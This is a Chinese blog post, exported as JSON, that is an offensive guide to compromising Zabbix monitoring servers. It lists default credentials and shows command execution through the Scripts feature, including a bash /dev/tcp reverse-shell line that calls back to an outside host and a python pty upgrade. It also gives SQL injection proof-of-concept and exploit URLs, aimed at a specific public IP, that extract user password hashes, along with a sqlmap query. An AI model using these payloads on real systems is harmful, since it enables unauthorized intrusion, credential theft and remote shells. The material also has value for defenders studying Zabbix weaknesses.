{"title":"Zabbix服务脆弱性.md","slug":"网安大类/漏洞脆弱性分析/监控(Monitor)/Zabbix服务脆弱性","date":"2019-05-01T05:36:30.000Z","updated":"2022-03-29T05:39:05.027Z","url":"2019/5-1-427.html","path":"api/articles/2019/5-1-427.html.json","covers":["https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/20190425155416.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/20190425155509.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/20190425155543.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/20190425160103.png"],"content":"<p>[TOC]</p>\n<a id=\"more\"></a>\n<h4 id=\"1-Zabbix缺省配置\"><a href=\"#1-Zabbix缺省配置\" class=\"headerlink\" title=\"1.Zabbix缺省配置\"></a>1.Zabbix缺省配置</h4><p>zabbix缺省账号密码一览：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">admin zabbix  <span class=\"comment\">#老版本 </span></span><br><span class=\"line\">Admin zabbix  <span class=\"comment\">#新版本</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#zabbix数据库</span></span><br><span class=\"line\">root zabbix</span><br><span class=\"line\">zabbix zabbix</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"2-Zabbix命令执行\"><a href=\"#2-Zabbix命令执行\" class=\"headerlink\" title=\"2.Zabbix命令执行\"></a>2.Zabbix命令执行</h4><p>注意新老版本触发差不多的,此项利用需要登陆后之中在管理菜单栏,然后选择脚本选项卡,添加脚本即可;<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/20190425155416.png\" alt=\"WeiyiGeek.创建脚本\" title=\"\" class=\"\">\n                <p>WeiyiGeek.创建脚本</p>\n            </figure></p>\n<p>设置触发动作来执行我们的脚本：<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/20190425155509.png\" alt=\"WeiyiGeek.触发动作\" title=\"\" class=\"\">\n                <p>WeiyiGeek.触发动作</p>\n            </figure></p>\n<p>触发后再首页执行：<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/20190425155543.png\" alt=\"WeiyiGeek.触发执行\" title=\"\" class=\"\">\n                <p>WeiyiGeek.触发执行</p>\n            </figure></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#触发执行后再tmp可以看见建立的txt文件</span></span><br><span class=\"line\">[root@zabbix tmp]$ cat test.txt</span><br><span class=\"line\">root</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#最好就是反弹到vps上来获得交互式shell，比较方便</span></span><br><span class=\"line\">/bin/bash -i &amp;&gt;/dev/tcp 192.168.1.1 5252 0&gt;&amp;1</span><br><span class=\"line\"><span class=\"comment\">#常常采用python的反弹脚本进行反弹：</span></span><br><span class=\"line\">python -c <span class=\"string\">'import pty; pty.spawn(\"/bin/sh\")'</span>  <span class=\"comment\">#设置返回shell的显示格式否则显示bash-4.1$</span></span><br></pre></td></tr></table></figure>\n<figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/20190425160103.png\" alt=\"WeiyiGeek.pythonReverse\" title=\"\" class=\"\">\n                <p>WeiyiGeek.pythonReverse</p>\n            </figure>\n<p><em>注意点：</em></p>\n<ul>\n<li>当前zabbix执行的权限问题</li>\n<li>当前服务器防火墙等等问题(有时监控80端口即可,大部分是放行状态)</li>\n</ul>\n<hr>\n\n<h4 id=\"3-ZabbixSQL注入\"><a href=\"#3-ZabbixSQL注入\" class=\"headerlink\" title=\"3.ZabbixSQL注入\"></a>3.ZabbixSQL注入</h4><p><strong>1.jsrpc.php rofileIdx2</strong><br>存在insert方式的SQL注入漏洞，攻击者无需授权登陆即可登陆zabbix管理系统，也可通过script等功能轻易直接获取zabbix服务器的操作系统权限。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POC:</span><br><span class=\"line\">http://158.199.140.129/jsrpc.php?sid=0bcd4ade648214dc&amp;<span class=\"built_in\">type</span>=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=2<span class=\"string\">'3297&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&amp;itemids[23297]=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=1</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">关键字:You have an error in your SQL syntax</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">EXP:</span></span><br><span class=\"line\"><span class=\"string\">http://158.199.140.129/jsrpc.php?type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=1 or (select 1 from (select count(*),concat((select (select concat(passwd)) from zabbix.users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or 1=1)%23&amp;updateProfile=true&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17</span></span><br></pre></td></tr></table></figure></p>\n<hr>\n\n<p><strong>2.latest.php toggle_ids</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;158.199.140.129&#x2F;latest.php?output&#x3D;ajax&amp;sid&#x3D;&amp;favobj&#x3D;toggle&amp;toggle_open_state&#x3D;1&amp;toggle_ids[]&#x3D;15385); select * from users where (1&#x3D;1</span><br><span class=\"line\"></span><br><span class=\"line\">SQLMAP:</span><br><span class=\"line\">--dbms&#x3D;mysql --sql-query &quot;select * from users&quot;</span><br></pre></td></tr></table></figure></p>\n","comments":true,"excerpt":"[TOC]","categories":[{"name":"漏洞分析","path":"api/categories/漏洞分析.json"}],"tags":[{"name":"zabbix","path":"api/tags/zabbix.json"}]}